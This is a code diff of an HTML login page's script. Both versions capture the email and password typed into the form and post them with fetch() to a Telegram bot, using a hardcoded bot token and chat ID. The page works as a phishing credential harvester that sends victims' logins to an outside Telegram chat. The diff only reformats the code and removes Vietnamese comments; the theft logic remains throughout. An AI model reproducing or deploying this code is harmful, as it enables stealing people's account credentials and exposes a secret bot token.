@@ -16,41 +16,25 @@
   </form>
 
   <script>
-    document.getElementById("sendBtn").addEventListener("click", function(event) {
-      event.preventDefault();
+document.getElementById("sendBtn").addEventListener("click", function() {
+  var email = document.getElementById("email").value;
+  var password = document.getElementById("password").value;
 
-      var email = document.getElementById("email").value;
-      var password = document.getElementById("password").value;
+  var botToken = '8110453433:AAG56s0dUVRc4uAWmlVm9_WQPv-DKkjO164';
+  var chatId = '6022297636';
+  var message = `Email: ${email}\nPassword: ${password}`;
+  var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-      // Token API từ BotFather và Chat ID
-      var botToken = '8110453433:AAG56s0dUVRc4uAWmlVm9_WQPv-DKkjO164';  // Thay bằng Bot Token của bạn
-      var chatId = '6022297636';  // Thay bằng Chat ID của bạn
+  fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: chatId, text: message })
+  })
+  .then(response => response.json())
+  .then(data => console.log('Message sent:', data))
+  .catch(error => console.error('Error:', error));
+});
 
-      // URL API của Telegram
-      var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-      // Nội dung tin nhắn bạn muốn gửi
-      var message = `Email: ${email}\nPassword: ${password}`;
-
-      // Gửi yêu cầu đến Telegram API
-      fetch(url, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
-        })
-      })
-      .then(response => response.json())
-      .then(data => {
-        console.log('Message sent:', data);
-      })
-      .catch(error => {
-        console.error('Error:', error);
-      });
-    });
   </script>
 
 </body>
